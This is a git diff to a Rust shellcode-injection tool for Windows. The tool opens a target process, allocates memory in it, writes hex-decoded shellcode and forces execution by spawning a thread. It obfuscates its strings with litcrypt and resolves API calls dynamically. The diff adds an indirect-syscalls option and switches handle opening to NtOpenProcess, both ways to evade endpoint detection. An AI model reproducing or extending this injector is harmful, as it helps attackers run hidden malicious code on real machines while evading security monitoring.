@@ -4,8 +4,8 @@ use_litcrypt!();
 
 use std::{ffi::c_void, mem::size_of, ptr, env};
 
-use bindings::Windows::Win32::{System::{Threading::{PROCESS_BASIC_INFORMATION, PEB}, WindowsProgramming::LDR_DATA_TABLE_ENTRY, Kernel::LIST_ENTRY, Diagnostics::ToolHelp::THREADENTRY32}, Foundation::{HANDLE}};
-use data::{PVOID, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_COMMIT, MEM_RESERVE, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_VM_OPERATION, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION};
+use bindings::Windows::Win32::{System::{Threading::{PROCESS_BASIC_INFORMATION, PEB}, WindowsProgramming::{LDR_DATA_TABLE_ENTRY, OBJECT_ATTRIBUTES}, Kernel::LIST_ENTRY, Diagnostics::ToolHelp::THREADENTRY32}, Foundation::{HANDLE}};
+use data::{PVOID, PAGE_EXECUTE_READ, PAGE_READWRITE, MEM_COMMIT, MEM_RESERVE, PROCESS_QUERY_LIMITED_INFORMATION, PROCESS_VM_READ, PROCESS_VM_WRITE, PROCESS_VM_OPERATION, PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, CLIENT_ID};
 use getopts::Options;
 
 fn get_sh() -> String
@@ -26,17 +26,23 @@ fn main() {
         opts.optflag("f", "force", "Spawn a dummy thread on target process to force the shellcode execution.");
         opts.optflag("s", "signal", "Signal ALL target process' threads to exit. BE CAREFUL.");
         opts.optflag("d", "debug", "Enable DEBUG privilege.");
+        opts.optflag("i", "indirect", "Use indirect syscalls.");
 
         let matches = match opts.parse(&args[1..]) {
             Ok(m) => { m }
             Err(x) => {println!("{}",x);print!("{}","[x] Invalid arguments. Use -h for detailed help."); return; }
         };
 
-
         if matches.opt_present("h") || !matches.opt_present("p") 
         {
             print_usage(&program, opts);
             return;
+        }
+
+        if matches.opt_present("i")
+        {
+            dinvoke::use_indirect_sys(true);
+            println!("{}", &lc!("[-] Using indirect syscalls."));
         }
 
         let mut dummy_thread = false;
@@ -77,10 +83,21 @@ fn main() {
             desired_access = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION;
         }
 
-        let phand: HANDLE = dinvoke::open_process(desired_access, 0, pid);
-
-
-        if phand.0 == 0
+        let h = HANDLE::default();
+        let handle_ptr: *mut HANDLE = std::mem::transmute(&h);
+        let o = OBJECT_ATTRIBUTES::default();
+        let object_attributes: *mut OBJECT_ATTRIBUTES = std::mem::transmute(&o);
+        let client_id = CLIENT_ID {unique_process: HANDLE{0: pid as isize}, unique_thread: HANDLE::default()};
+        let client_id: *mut CLIENT_ID = std::mem::transmute(&client_id);
+        let status = dinvoke::nt_open_process(
+            handle_ptr,
+            desired_access,
+            object_attributes,
+            client_id
+        );
+        
+        let phand: HANDLE = *handle_ptr;
+        if phand.0 == 0 || status != 0
         {
             println!("{}",&lc!("[x] Couldn't open a handle to the target process."));
             return;
@@ -95,7 +112,6 @@ fn main() {
         let decoded_sh = hex::decode(sh).expect("");
         let size_sh = decoded_sh.len();
         let size: *mut usize = std::mem::transmute(&size_sh);
-
         let ret = dinvoke::nt_allocate_virtual_memory(
             phand, 
             base_address_shellcode, 
@@ -270,17 +286,10 @@ fn main() {
             let k32 = dinvoke::get_module_base_address(&lc!("kernelbase.dll"));
             let exitthread = dinvoke::get_function_address(k32, &lc!("ExitThread"));
 
-            let func: data::NtCreateThreadEx;
-            let ret: Option<i32>;
-            let ntdll = dinvoke::get_module_base_address(&lc!("ntdll.dll"));
             let h = HANDLE::default();
             let handle: *mut HANDLE = std::mem::transmute(&h);
             let start_routine: PVOID = std::mem::transmute(exitthread);
-            dinvoke::dynamic_invoke!(
-                ntdll,
-                &lc!("NtCreateThreadEx"),
-                func,
-                ret,
+            let ret = dinvoke::nt_create_thread_ex(
                 handle,
                 0x1FFFFF,
                 ptr::null_mut(),
@@ -291,7 +300,7 @@ fn main() {
                 ptr::null_mut()
             );
 
-            if ret.unwrap() != 0
+            if ret != 0
             {
                 println!("{}",&lc!("[x] Dummy thread spawn failed."));
             }
@@ -299,6 +308,7 @@ fn main() {
             {
                 println!("{}",&lc!("[+] Dummy thread successfully spawned."));
             }
+
         }
         else if matches.opt_present("s") 
         {
